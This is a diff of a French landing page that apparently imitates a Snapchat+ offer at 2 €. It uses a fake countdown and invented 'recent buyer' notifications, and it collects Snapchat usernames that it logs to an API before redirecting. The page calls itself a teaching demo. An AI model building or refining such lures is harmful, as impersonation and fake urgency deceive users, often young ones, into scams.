@@ -44,8 +44,22 @@
 
     .offer{margin-top:18px;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:16px}
     .count{font-size:32px;font-weight:900;letter-spacing:1px}
-    .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff}
-    .cta{margin-top:12px;background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:14px;border-radius:14px;font-weight:900;cursor:pointer;width:100%}
+    .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff;margin-bottom:20px}
+    .cta{
+      display:block;
+      margin-top:24px;
+      background:linear-gradient(90deg,var(--grad1),var(--grad2));
+      color:#212127;
+      border:0;
+      padding:16px;
+      border-radius:14px;
+      font-weight:900;
+      cursor:pointer;
+      width:100%;
+      text-align:center;
+      font-size:18px;
+    }
+    .cta:hover{filter:brightness(1.05)}
 
     /* Toasts */
     .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
@@ -67,7 +81,6 @@
   </div>
 
   <main class="wrap">
-    <!-- HERO -->
     <section class="hero">
       <h1>Récupère 1 an de Snap+</h1>
       <p class="muted">Design d’origine conservé, offre 2 €, et preuves sociales.</p>
@@ -89,42 +102,44 @@
           </div>
           <div class="chip">+ 3 129</div>
         </div>
-
         <div class="buy-list" id="buy-list"></div>
       </div>
 
-      <!-- Features (look ancien) -->
+      <!-- Features -->
       <div class="features">
-        <div class="feature"><h3 style="margin:0 0 8px">Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Priorité premium</h3><p class="muted">Certaines fonctionnalités prioritaires.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Sans engagement</h3><p class="muted">Arrête quand tu veux, en 2 clics.</p></div>
+        <div class="feature"><h3>Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
+        <div class="feature"><h3>Priorité premium</h3><p class="muted">Certaines fonctionnalités prioritaires.</p></div>
+        <div class="feature"><h3>Sans engagement</h3><p class="muted">Arrête quand tu veux, en 2 clics.</p></div>
       </div>
 
-      <!-- Offre + compteur + form -->
+      <!-- Offre + formulaire -->
       <div class="offer" id="acheter">
         <div class="row" style="gap:10px;align-items:center;margin-bottom:10px">
-          <div style="display:flex;align-items:center;gap:8px"><span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong></div>
+          <div style="display:flex;align-items:center;gap:8px">
+            <span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong>
+          </div>
         </div>
         <div class="count" id="count">00:15:00</div>
         <div style="height:1px;background:#1a1d2a;margin:12px 0"></div>
         <div class="row" style="gap:10px;align-items:center;margin:6px 0 10px">
-          <div class="kpi" style="flex:0 0 auto;padding:8px 12px"><div class="big" style="font-size:20px">2€</div></div>
+          <div class="kpi" style="flex:0 0 auto;padding:8px 12px">
+            <div class="big" style="font-size:20px">2€</div>
+          </div>
           <div class="muted">au lieu de 47,99€ pour 1 an complet</div>
         </div>
 
-        <!-- ⚠️ IMPORTANT : IDs à ne pas modifier -->
         <input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)">
         <a id="cta" href="#" class="cta">Obtenir Snap+ maintenant 🔒</a>
-        <p class="muted" style="font-size:12px;margin-top:8px">Démo pédagogique — non affiliée à Snap Inc.</p>
+
+        <p class="muted" style="font-size:12px;margin-top:12px">Démo pédagogique — non affiliée à Snap Inc.</p>
       </div>
     </section>
   </main>
 
-  <!-- Toasts visuels (bas droite) -->
+  <!-- Toasts -->
   <div class="toasts" id="toasts"></div>
 
   <script>
-    // --- Compte à rebours 15 min ---
     (function countdown(dur=15*60){
       let s=dur; const el=document.getElementById("count");
       function tick(){
@@ -135,9 +150,7 @@
       tick();
     })();
 
-    // --- Endpoints (relatifs pour Vercel) ---
     const LOG_API = "/api/log";
-
     async function sendLog(evt){
       try{
         await fetch(LOG_API,{
@@ -145,10 +158,9 @@
           headers:{ "Content-Type":"application/json" },
           body: JSON.stringify({ ...evt, path: location.pathname })
         });
-      }catch(e){/* on n'empêche pas la redirection */}
+      }catch(e){}
     }
 
-    // --- CTA : log + redirection vers /process.html ---
     (function attachCTA(){
       const btn = document.getElementById("cta");
       const input = document.getElementById("snuser");
@@ -158,13 +170,11 @@
         e.preventDefault();
         const u = (input.value || "").trim();
         if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
-
         await sendLog({ event_type:"checkout_start", user_name:u });
         window.location.href = "/process.html?u=" + encodeURIComponent(u);
       });
     })();
 
-    // --- Preuves sociales : liste + toasts ---
     const starters = [
       {name:"maria_e", ago:"il y a 8m"},
       {name:"emma-k", ago:"il y a 10m"},
